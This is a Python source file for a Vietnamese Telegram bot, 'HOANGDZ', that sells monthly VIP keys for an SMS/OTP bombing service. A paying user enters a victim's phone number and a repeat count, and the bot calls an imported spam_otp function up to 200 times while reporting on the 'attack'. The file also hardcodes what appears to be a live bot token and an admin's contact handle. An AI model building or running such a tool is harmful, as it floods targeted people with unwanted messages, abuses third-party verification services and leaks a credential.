import telebot
from telebot import types
import threading
import time
import json
import os

# --- CẤU HÌNH ---
TOKEN = '8753346679:AAGtcyDb8PXvs3_JAQEbzeCQBKyCEt9FRxc'
BOT_NAME = "HOANGDZ"
ADMIN_ID = 8753346679  # <<< THAY ID CỦA BẠN VÀO ĐÂY
bot = telebot.TeleBot(TOKEN)

# Import logic spam từ file sms.py
try:
    import sms
except ImportError:
    print("❌ Lỗi: Không tìm thấy file 'sms.py'.")

# --- QUẢN LÝ DATABASE (Lưu người dùng và Key) ---
DB_FILE = "hoangdz_database.json"

def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {"keys": {}, "users": []}

def save_db(data):
    with open(DB_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4)

# --- MENU CHÍNH ---
@bot.message_handler(commands=['start', 'menu'])
def send_menu(message):
    uid = str(message.from_user.id)
    db = load_db()
    if uid not in db["users"]:
        db["users"].append(uid)
        save_db(db)

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(types.KeyboardButton('/sms 🚀'), types.KeyboardButton('/muakey 🎫'))
    markup.add(types.KeyboardButton('/profile 👤'), types.KeyboardButton('/help ❓'))
    
    welcome_text = (
        f"👑 **HỆ THỐNG TOOL {BOT_NAME}** 👑\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👋 Chào mừng: **{message.from_user.first_name}**\n"
        f"📢 Thông báo: Tool đã cập nhật API mới nhất!\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"Vui lòng chọn chức năng bên dưới:"
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=markup)

# --- XỬ LÝ LỆNH /SMS (YÊU CẦU KEY) ---
@bot.message_handler(func=lambda m: m.text in ['/sms 🚀', '/sms'])
def sms_start(message):
    db = load_db()
    uid = str(message.from_user.id)
    
    # Kiểm tra quyền (Admin hoặc có Key)
    if uid not in db["keys"] and int(uid) != ADMIN_ID:
        bot.reply_to(message, "❌ **TRUY CẬP BỊ TỪ CHỐI**\nBạn cần mua Key VIP để sử dụng. Gõ /muakey để biết thêm chi tiết.")
        return

    msg = bot.send_message(message.chat.id, f"👤 [{BOT_NAME}] Nhập **Số điện thoại** cần tấn công:", parse_mode="Markdown")
    bot.register_next_step_handler(msg, get_phone)

def get_phone(message):
    phone = message.text
    if not phone.isdigit() or len(phone) < 10:
        bot.reply_to(message, "❌ Số điện thoại không hợp lệ! Vui lòng thử lại.")
        return
    
    msg = bot.send_message(message.chat.id, f"🔢 [{BOT_NAME}] Nhập **Số lần** muốn spam:", parse_mode="Markdown")
    bot.register_next_step_handler(msg, lambda m: start_attack(m, phone))

def start_attack(message, phone):
    try:
        count = int(message.text)
        if count > 200: count = 200 # Giới hạn tránh quá tải API
        
        bot.send_message(message.chat.id, f"🚀 **{BOT_NAME} KHỞI CHẠY...**\n📱 Mục tiêu: `{phone}`\n🔄 Lượt chạy: `{count}`", parse_mode="Markdown")
        
        def run():
            for i in range(1, count + 1):
                try:
                    sms.spam_otp(phone) # Gọi hàm từ sms.py
                except: pass
                
                if i % 10 == 0 or i == count:
                    bot.send_message(message.chat.id, f"✅ {BOT_NAME} gửi thành công: {i}/{count} lượt.")
                time.sleep(0.1)
            bot.send_message(message.chat.id, f"🏁 **{BOT_NAME} HOÀN THÀNH!**\nĐã tấn công xong mục tiêu: `{phone}`")

        threading.Thread(target=run).start()
    except:
        bot.reply_to(message, "❌ Vui lòng nhập số lần bằng số!")

# --- LỆNH ADMIN: GỬI THÔNG BÁO CHO TẤT CẢ (BROADCAST) ---
@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    if message.from_user.id != ADMIN_ID: return
    
    content = message.text.replace('/broadcast', '').strip()
    if not content:
        bot.reply_to(message, "Cú pháp: `/broadcast [Nội dung]`")
        return
    
    db = load_db()
    count = 0
    for user_id in db["users"]:
        try:
            bot.send_message(user_id, f"📢 **THÔNG BÁO TỪ {BOT_NAME}**\n━━━━━━━━━━━━━━━━━━\n{content}", parse_mode="Markdown")
            count += 1
        except: pass
    bot.reply_to(message, f"✅ Đã gửi thông báo thành công đến {count} người dùng.")

# --- LỆNH ADMIN: CẤP KEY VIP ---
@bot.message_handler(commands=['addkey'])
def add_key(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        # Cú pháp: /addkey [ID] [Hạn dùng]
        args = message.text.split()
        target_id = args[1]
        expiry = args[2]
        
        db = load_db()
        db["keys"][target_id] = {"expiry": expiry}
        save_db(db)
        
        bot.send_message(target_id, f"🎉 **{BOT_NAME} VIP:** Chúc mừng! Bạn đã được Admin cấp quyền VIP.\nHạn dùng: {expiry}")
        bot.reply_to(message, f"✅ Đã cấp Key VIP cho ID: `{target_id}`")
    except:
        bot.reply_to(message, "Cú pháp: `/addkey [ID] 30_Ngay`")

# --- CÁC LỆNH KHÁC ---
@bot.message_handler(commands=['muakey'])
def muakey(message):
    msg = (
        f"🎫 **HƯỚNG DẪN MUA KEY {BOT_NAME}**\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"💳 Giá Key VIP: 50.000đ / tháng\n"
        f"👤 Liên hệ Admin: @tranhoang2285\n"
        f"ℹ️ Gửi **ID của bạn** cho Admin để kích hoạt: `{message.from_user.id}`"
    )
    bot.send_message(message.chat.id, msg, parse_mode="Markdown")

@bot.message_handler(commands=['profile'])
def profile(message):
    db = load_db()
    uid = str(message.from_user.id)
    if uid in db["keys"] or int(uid) == ADMIN_ID:
        expiry = db["keys"].get(uid, {}).get("expiry", "Vĩnh viễn (Admin)")
        bot.reply_to(message, f"👤 **PROFILE {BOT_NAME}**\n🎫 Trạng thái: **VIP Member** 👑\n⏳ Hạn dùng: {expiry}")
    else:
        bot.reply_to(message, f"👤 **PROFILE {BOT_NAME}**\n🎫 Trạng thái: Thành viên Miễn phí\n🆔 ID của bạn: `{uid}`")

print(f"Bot {BOT_NAME} đang chạy...")
bot.infinity_polling()
